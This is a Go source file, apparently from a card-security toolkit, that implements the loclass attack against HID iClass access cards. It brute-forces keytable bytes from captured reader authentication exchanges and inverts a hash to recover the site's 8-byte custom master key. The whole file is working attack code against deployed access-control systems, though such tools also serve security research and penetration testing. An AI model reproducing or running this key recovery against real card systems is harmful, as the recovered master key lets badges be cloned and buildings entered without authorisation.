package iclass

import (
	"context"
	"encoding/hex"
	"fmt"
)

// Recover performs the loclass attack against the provided capture set and
// returns the 8-byte Kcus (iClass custom master key) together with a hex
// string representation.
//
// The attack requires captures whose CSN Hash1 outputs collectively cover all
// keytable indices 0..15. With Swende-optimal CSN selection, 8 captures
// suffice; with arbitrary CSNs more may be needed. Iterates until all 16
// positions are recovered or no progress is made.
//
// ctx is checked periodically in the brute-force loop.
func Recover(ctx context.Context, captures []Capture) ([8]byte, string, error) {
	if len(captures) == 0 {
		return [8]byte{}, "", fmt.Errorf("no captures provided")
	}

	// keytable[i]: low byte = recovered value; high byte = status (0=unknown, 0x01=cracked).
	keytable := [128]uint16{}

	// Iterate multiple passes to handle ordering dependencies:
	// a later capture may reduce unknowns after earlier captures cracked some positions.
	for pass := 0; pass < 20; pass++ {
		if err := ctx.Err(); err != nil {
			return [8]byte{}, "", fmt.Errorf("cancelled: %w", err)
		}

		prevCracked := crackedCount(keytable[:])

		for i := range captures {
			if err := ctx.Err(); err != nil {
				return [8]byte{}, "", fmt.Errorf("cancelled: %w", err)
			}
			// Ignore per-capture errors — continue with remaining captures.
			_ = bruteForceCapture(ctx, captures[i], keytable[:])
		}

		if crackedCount(keytable[:]) >= 16 {
			break // all required positions recovered
		}
		if crackedCount(keytable[:]) == prevCracked {
			break // no progress in this pass — give up
		}
	}

	// Verify all 16 positions were recovered.
	var first16 [16]byte
	for i := 0; i < 16; i++ {
		if keytable[i]>>8 == 0 {
			return [8]byte{}, "", fmt.Errorf("keytable position %d was not recovered (covered %d/16)",
				i, crackedCount(keytable[:]))
		}
		first16[i] = uint8(keytable[i] & 0xFF)
	}

	kcus, err := InvertHash2(first16)
	if err != nil {
		return [8]byte{}, "", fmt.Errorf("invert hash2: %w", err)
	}

	hexKey := hex.EncodeToString(kcus[:])
	return kcus, hexKey, nil
}

// crackedCount returns the number of positions in keytable[0..15] that have
// been successfully cracked.
func crackedCount(keytable []uint16) int {
	n := 0
	for i := 0; i < 16; i++ {
		if keytable[i]>>8 != 0 {
			n++
		}
	}
	return n
}

// bruteForceCapture attempts to recover unknown keytable bytes referenced by
// this capture's Hash1 indices. Updates keytable on success (marks high byte
// = 1). Returns nil if skipped (too many unknowns or already fully cracked).
// Returns an error only on context cancellation.
func bruteForceCapture(ctx context.Context, cap Capture, keytable []uint16) error { //nolint:gocognit
	h1 := Hash1(cap.CSN)

	// Collect unique unknown indices from h1[0..7], allowing up to 3 unknowns.
	var bytesToRecover [3]uint8
	numUnknown := 0

	for _, idx := range h1 {
		if keytable[idx]>>8 != 0 {
			continue // already cracked
		}
		// Deduplicate: same index appearing multiple times in h1 counts once.
		alreadyQueued := false
		for k := 0; k < numUnknown; k++ {
			if bytesToRecover[k] == idx {
				alreadyQueued = true
				break
			}
		}
		if alreadyQueued {
			continue
		}
		if numUnknown == 3 {
			// > 3 unknowns — this capture is not attackable right now.
			return nil
		}
		bytesToRecover[numUnknown] = idx
		numUnknown++
	}

	if numUnknown == 0 {
		return nil // nothing to do
	}

	var ccNR [12]byte
	copy(ccNR[:8], cap.CC[:])
	copy(ccNR[8:], cap.NR[:])

	endMask := uint32(1) << (8 * uint(numUnknown))

	for brute := uint32(0); (brute & endMask) == 0; brute++ {
		if brute&0xFFFF == 0 {
			if err := ctx.Err(); err != nil {
				return fmt.Errorf("cancelled: %w", err)
			}
		}

		// Load current guess values into keytable low bytes.
		for j := 0; j < numUnknown; j++ {
			idx := bytesToRecover[j]
			keytable[idx] = uint16((brute >> (uint(j) * 8)) & 0xFF)
		}

		// Assemble key_sel (iClass format) from keytable.
		var keySel [8]byte
		for j, idx := range h1 {
			keySel[j] = uint8(keytable[idx] & 0xFF)
		}

		// Diversify and check MAC.
		keySelStd := PermuteKeyRev(keySel)
		divKey, err := DiversifyKey(cap.CSN, keySelStd)
		if err != nil {
			continue
		}

		if DoReaderMAC(ccNR, divKey) == cap.MAC {
			// Mark cracked: set high byte to 1.
			for j := 0; j < numUnknown; j++ {
				idx := bytesToRecover[j]
				keytable[idx] |= 0x0100 // cracked flag in high byte
			}
			return nil
		}
	}

	// Brute force exhausted without finding the key for this capture.
	// Leave positions as unknown so a later capture can try them.
	for j := 0; j < numUnknown; j++ {
		keytable[bytesToRecover[j]] = 0 // reset to unknown
	}
	return nil
}
